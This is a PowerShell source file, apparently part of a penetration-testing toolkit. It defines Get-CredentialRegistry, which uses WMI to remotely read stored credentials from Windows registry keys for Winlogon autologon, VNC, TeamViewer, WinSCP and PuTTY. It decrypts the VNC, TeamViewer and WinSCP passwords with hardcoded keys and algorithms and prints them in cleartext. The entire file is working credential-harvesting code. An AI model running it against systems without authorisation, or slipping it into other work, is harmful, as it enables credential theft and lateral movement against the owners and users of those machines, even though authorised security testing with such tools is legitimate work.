#requires -version 3

Function Get-CredentialRegistry {
<#
.SYNOPSIS
    Get credentials from registry keys located on a remote computer.
    Privileges required: high

    Author: Timothée MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-CredentialRegistry enumerates registry keys containing credentials on a remote host through WMI.

.PARAMETER ComputerName
    Specifies the target host.

.PARAMETER Ping
    Ensures host is up before run.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER Authentication
    Specifies what authentication method should be used.

.PARAMETER Protocol
    Specifies the protocol to use, defaults to DCOM.

.EXAMPLE
    PS C:\> Get-CredentialRegistry -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty,

        [ValidateSet('Default', 'Kerberos', 'Negotiate', 'NtlmDomain')]
        [String]
        $Authentication = 'Default',

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom'
    )

    BEGIN {
        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
            Write-Verbose "[$ComputerName] Host is unreachable."
            break
        }

        $cimOption = New-CimSessionOption -Protocol $Protocol
        try {
            if (-not $PSBoundParameters['ComputerName']) {
                $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
            elseif ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
        }
        catch [System.Management.Automation.PSArgumentOutOfRangeException] {
            Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
            break
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
                break
            }
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Verbose "[$ComputerName] Access denied."
                break
            }
            else {
                Write-Verbose "[$ComputerName] Failed to establish CIM session."
                break
            }
        }
    }

    PROCESS {

        # Common credential registry keys

        Get-WinlogonCredentialRegistry -CimSession $cimSession
        Get-VncCredentialRegistry -CimSession $cimSession
        Get-TeamViewerCredentialRegistry -CimSession $cimSession

        # User credential registry keys

        [uint32]$HKU = 2147483651
        $SIDS = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=''} -CimSession $cimSession -Verbose:$false | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
        foreach ($SID in $SIDs) {
            Get-VncCredentialRegistry -CimSession $cimSession -SID $SID
            Get-TeamViewerCredentialRegistry -CimSession $cimSession -SID $SID
            Get-WinScpCredentialRegistry -CimSession $cimSession -SID $SID
            Get-PuttyCredentialRegistry -CimSession $cimSession -SID $SID
        }
    }

    END {
        Remove-CimSession -CimSession $cimSession
    }
}

Function Local:Get-WinlogonCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession
    )

    [uint32]$HKLM = 2147483650
    $location = "SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

    if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultPassword'} -CimSession $cimSession -Verbose:$false).sValue) {
        $creds = New-Object -TypeName psobject
        if ($domain = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultDomainName'} -CimSession $cimSession -Verbose:$false).sValue) {
            $creds | Add-Member -MemberType NoteProperty -Name 'Domain' -Value $domain
        }
        if ($username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultUserName'} -CimSession $cimSession -Verbose:$false).sValue) {
            $creds | Add-Member -MemberType NoteProperty -Name 'Username' -Value $username
        }
        $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value $password
        $result = New-Object -TypeName psobject
        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
        $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
        Write-Output $result
    }

    if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='AltDefaultPassword'} -CimSession $cimSession -Verbose:$false).sValue) {
        $creds = New-Object -TypeName psobject
        if ($domain = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultDomainName'} -CimSession $cimSession -Verbose:$false).sValue) {
            $creds | Add-Member -MemberType NoteProperty -Name 'Domain' -Value $domain
        }
        if ($username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultUserName'} -CimSession $cimSession -Verbose:$false).sValue) {
            $creds | Add-Member -MemberType NoteProperty -Name 'Username' -Value $username
        }
        $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value $password
        $result = New-Object -TypeName psobject
        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
        $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
        Write-Output $result
    }
}

Function Local:Get-VncCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [String]
        $SID
    )

    BEGIN {
        Function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
            if ($EncryptedPassword.Length -lt 8) {
                return ""
            }
            [byte[]] $seed = (23, 82, 107, 6, 35, 78, 88, 7)
            $key = New-Object byte[] $seed.Length
            for ($i = 0; $i -lt 8; $i++) {
                $key[$i] = (
                    (($seed[$i] -band 0x01) -shl 7) -bor
                    (($seed[$i] -band 0x02) -shl 5) -bor
                    (($seed[$i] -band 0x04) -shl 3) -bor
                    (($seed[$i] -band 0x08) -shl 1) -bor
                    (($seed[$i] -band 0x10) -shr 1) -bor
                    (($seed[$i] -band 0x20) -shr 3) -bor
                    (($seed[$i] -band 0x40) -shr 5) -bor
                    (($seed[$i] -band 0x80) -shr 7)
                )
            }
            $des = New-Object Security.Cryptography.DESCryptoServiceProvider
            $des.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
            return [Text.Encoding]::UTF8.GetString($des.CreateDecryptor($key, $null).TransformFinalBlock($EncryptedPassword, 0, $EncryptedPassword.Length));
        }

        Function Local:HexStringToByteArray ([string] $HexString) {    
            $byteArray = New-Object Byte[] ($HexString.Length/2);
            for ($i = 0; $i -lt $HexString.Length; $i += 2) {
                $byteArray[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
            }
            return @( ,$byteArray)
        }

        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        $commonKeys = @(
            "SOFTWARE\RealVNC\WinVNC4"
            "SOFTWARE\RealVNC\vncserver"
            "SOFTWARE\RealVNC\Default"
            "SOFTWARE\Wow6432Node\RealVNC\WinVNC4"
            "SOFTWARE\TigerVNC\WinVNC4"
            "SOFTWARE\TightVNC\Server"
            "SOFTWARE\ORL\WinVNC3"
            "SOFTWARE\ORL\WinVNC3\Default"
            "SOFTWARE\ORL\WinVNC\Default"
        )

        [uint32]$HKLM = 2147483650
        [uint32]$HKU = 2147483651
        $hive = $HKLM
        foreach ($location in $commonKeys) {
            if ($SID) {
                $location = "$SID\$location"
                $hive = $HKU
            }
            if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="Password"} -CimSession $cimSession -Verbose:$false).uValue) {
                $creds = New-Object -TypeName psobject
                $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword($password))
                $port = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWORDValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="PortNumber"} -CimSession $cimSession -Verbose:$false).uValue
                if(-not $port) {
                    $port = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWORDValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="RfbPort"} -CimSession $cimSession -Verbose:$false).uValue
                }
                $creds | Add-Member -MemberType NoteProperty -Name 'Port' -Value $port
                if ($viewOnlyPassword = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="PasswordViewOnly"} -CimSession $cimSession -Verbose:$false).uValue) {
                    $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword(HexStringToByteArray($viewOnlyPassword)))
                }
                if ($controlPassword = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="ControlPassword"} -CimSession $cimSession -Verbose:$false).uValue) {
                    $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword(HexStringToByteArray($controlPassword)))
                }
                $result = New-Object -TypeName psobject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
                Write-Output $result
            }
        }
    }

    END {}
}

Function Local:Get-TeamViewerCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [String]
        $SID
    )

    BEGIN {
        Function Local:Create-AesManagedObject() {
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            $aesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
            $aesManaged.Padding = [Security.Cryptography.PaddingMode]::Zeros
            $aesManaged.BlockSize = 128
            $aesManaged.KeySize = 128
            $aesManaged.IV = 0x01,0x00,0x01,0x00,0x67,0x24,0x4f,0x43,0x6e,0x67,0x62,0xf2,0x5e,0xa8,0xd7,0x04
            $aesManaged.KEY = 0x06,0x02,0x00,0x00,0x00,0xa4,0x00,0x00,0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00
            return $aesManaged
        }

        Function Local:Get-TeamViewerDecryptedPassword($encryptedBytes) {
            $aesManaged = Create-AesManagedObject
            $decryptor = $aesManaged.CreateDecryptor()
            $unencryptedData = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
            $aesManaged.Dispose()
            return [Text.Encoding]::UTF8.GetString($unencryptedData)
        }

        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        $commonKeys = @(
            "SOFTWARE\TeamViewer"
            "SOFTWARE\WOW6432Node\TeamViewer"
        )

        $commonValues = @(
            "LicenseKeyAES"
            "OptionsPasswordAES"
            "PermanentPassword"
            "ProxyPasswordAES"
            "ServerPasswordAES"
            "SecurityPasswordAES"
            "SecurityPasswordExported"
        )

        [uint32]$HKLM = 2147483650
        [uint32]$HKU = 2147483651
        $hive = $HKLM

        foreach ($location in $commonKeys) {
            if ($SID) {
                $location = "$SID\$location"
                $hive = $HKU
            }
            $subKeys = Invoke-CimMethod -Namespace 'root/default' -ClassName 'StdRegProv' -MethodName 'EnumKey' -Arguments @{hDefKey=$hive; sSubKeyName=$location} -CimSession $cimSession -Verbose:$false
            foreach ($keyName in $subKeys.sNames) {
                $commonKeys += "$location\$keyName".Trim('\')
            }
        }

        foreach ($location in $commonKeys) {
            if ($SID) {
                $location = "$SID\$location"
                $hive = $HKU
            }

            $creds = New-Object -TypeName psobject
            $success = $False
            foreach ($valueName in $commonValues) {
                if ($value = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName=$valueName} -CimSession $cimSession -Verbose:$false).uValue) {
                    $creds | Add-Member -MemberType NoteProperty -Name $valueName -Value (Get-TeamViewerDecryptedPassword($value))
                    $success = $True
                }
            }
            if ($success) {
                $settingValues = @(
                    "BuddyLoginName"
                    "OwningManagerAccountName"
                    "Proxy_IP"
                    "ProxyUsername"
                )
                foreach ($valueName in $commonValues) {
                    if ($value = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName=$valueName} -CimSession $cimSession -Verbose:$false).sValue) {
                        $creds | Add-Member -MemberType NoteProperty -Name $valueName -Value $value
                    }
                }

                $result = New-Object -TypeName psobject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'TeamViewer'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
                Write-Output $result
            }
        }
    }

    END {}
}

Function Local:Get-WinScpCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Parameter(Mandatory = $True)]
        [String]
        $SID
    )

    BEGIN {
        Function Local:Get-WinSCPDecryptedPassword($SessionHostname, $SessionUsername, $Password) {
            $CheckFlag = 255
            $Magic = 163
            $len = 0
            $key =  $SessionHostname + $SessionUsername
            $values = DecryptNextCharacterWinSCP($Password)
            $storedFlag = $values.flag 
            if ($values.flag -eq $CheckFlag) {
                $values.remainingPass = $values.remainingPass.Substring(2)
                $values = DecryptNextCharacterWinSCP($values.remainingPass)
            }
            $len = $values.flag
            $values = DecryptNextCharacterWinSCP($values.remainingPass)
            $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
            $finalOutput = ""
            for ($i=0; $i -lt $len; $i++) {
                $values = (DecryptNextCharacterWinSCP($values.remainingPass))
                $finalOutput += [char]$values.flag
            }
            if ($storedFlag -eq $CheckFlag) {
                return $finalOutput.Substring($key.length)
            }
            return $finalOutput
        }

        Function Local:DecryptNextCharacterWinSCP($remainingPass) {
            # Creates an object with flag and remainingPass properties
            $flagAndPass = "" | Select-Object -Property flag,remainingPass
            # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
            $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
            $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
            $Added = $firstval + $secondval
            $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
            $flagAndPass.flag = $decryptedResult
            $flagAndPass.remainingPass = $remainingPass.Substring(2)
            return $flagAndPass
        }

        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        [uint32]$HKU = 2147483651
        $regKey = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
        $sessions = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=$regKey} -CimSession $cimSession -Verbose:$false
        if (($sessions | Select-Object -ExpandProperty ReturnValue) -eq 0) {
            $sessions = $sessions | Select-Object -ExpandProperty sNames
            foreach ($session in $sessions) {
                $location = "$regKey\$session"
                $hostname = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="HostName"} -CimSession $cimSession -Verbose:$false).sValue
                $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="UserName"} -CimSession $cimSession -Verbose:$false).sValue
                $password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="Password"} -CimSession $cimSession -Verbose:$false).sValue
                if ($password) {
                    $key = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security"
                    $masterPassUsed = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWordValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$key; sValueName="UseMasterPassword"} -CimSession $cimSession -Verbose:$false).uValue
                    if (!$masterPassUsed) {
                        $password = (Get-WinSCPDecryptedPassword $hostname $username $password)
                        $result = New-Object -TypeName psobject
                        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinSCP'
                        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                        $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value ([pscustomobject]@{Hostname=$hostname; Username=$username; Password=$password})
                        Write-Output $result
                    }
                }
            }
        }
    }

    END {}
}

Function Local:Get-PuttyCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Parameter(Mandatory = $True)]
        [String]
        $SID
    )

    BEGIN {
        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        [uint32]$HKU = 2147483651
        $regKey = $SID + "\SOFTWARE\SimonTatham\PuTTY\Sessions"
        $sessions = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=$regKey} -CimSession $cimSession -Verbose:$false
        if (($sessions | Select-Object -ExpandProperty ReturnValue) -eq 0) {
            $sessions = $sessions | Select-Object -ExpandProperty sNames
            foreach ($session in $sessions) {
                $location = "$regKey\$session"
                if ($keyFile = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="PublicKeyFile"} -CimSession $cimSession -Verbose:$false).sValue) {
                    $hostname = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="HostName"} -CimSession $cimSession -Verbose:$false).sValue
                    $port = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWORDValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="PortNumber"} -CimSession $cimSession -Verbose:$false).uValue
                    $protocol = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="Protocol"} -CimSession $cimSession -Verbose:$false).sValue
                    $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="UserName"} -CimSession $cimSession -Verbose:$false).sValue
                    if (-not $username -and $protocol -eq 'rlogin') {
                        $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="LocalUserName"} -CimSession $cimSession -Verbose:$false).sValue
                    }
                    $result = New-Object -TypeName psobject
                    $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                    $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'PuTTY'
                    $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                    $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value ([pscustomobject]@{Hostname=$hostname; Port=$port; Protocol=$protocol; Username=$username; KeyFile=$keyFile})
                    Write-Output $result
                }
            }
        }
    }

    END {}
}
